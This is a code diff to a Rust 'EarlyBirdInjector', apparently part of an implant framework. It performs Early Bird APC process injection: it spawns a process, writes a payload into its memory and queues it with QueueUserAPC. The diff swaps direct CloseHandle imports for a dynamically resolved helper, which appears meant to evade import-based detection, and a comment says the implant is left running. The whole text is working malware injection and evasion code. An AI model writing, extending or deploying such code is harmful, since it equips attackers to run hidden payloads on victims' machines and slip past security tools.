@@ -21,7 +21,6 @@ impl Injector for EarlyBirdInjector {
             ));
         }
 
-        use winapi::um::handleapi::CloseHandle;
         use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
         use winapi::um::processthreadsapi::{
             CreateProcessW, FlushInstructionCache, ResumeThread, PROCESS_INFORMATION, STARTUPINFOW,
@@ -69,8 +68,8 @@ impl Injector for EarlyBirdInjector {
             );
             if remote_mem.is_null() {
                 winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-                CloseHandle(pi.hThread);
-                CloseHandle(pi.hProcess);
+                pe_resolve::close_handle(pi.hThread);
+                pe_resolve::close_handle(pi.hProcess);
                 return Err(anyhow!("EarlyBird: VirtualAllocEx failed"));
             }
 
@@ -84,8 +83,8 @@ impl Injector for EarlyBirdInjector {
             ) == 0
             {
                 winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-                CloseHandle(pi.hThread);
-                CloseHandle(pi.hProcess);
+                pe_resolve::close_handle(pi.hThread);
+                pe_resolve::close_handle(pi.hProcess);
                 return Err(anyhow!("EarlyBird: WriteProcessMemory failed"));
             }
 
@@ -111,15 +110,15 @@ impl Injector for EarlyBirdInjector {
             let apc_fn: APCProc = std::mem::transmute(remote_mem);
             if QueueUserAPC(Some(apc_fn), pi.hThread, 0) == 0 {
                 winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-                CloseHandle(pi.hThread);
-                CloseHandle(pi.hProcess);
+                pe_resolve::close_handle(pi.hThread);
+                pe_resolve::close_handle(pi.hProcess);
                 return Err(anyhow!("EarlyBird: QueueUserAPC failed"));
             }
 
             ResumeThread(pi.hThread);
             // Detach — we don't wait so the implant keeps running.
-            CloseHandle(pi.hThread);
-            CloseHandle(pi.hProcess);
+            pe_resolve::close_handle(pi.hThread);
+            pe_resolve::close_handle(pi.hProcess);
         }
         Ok(())
     }
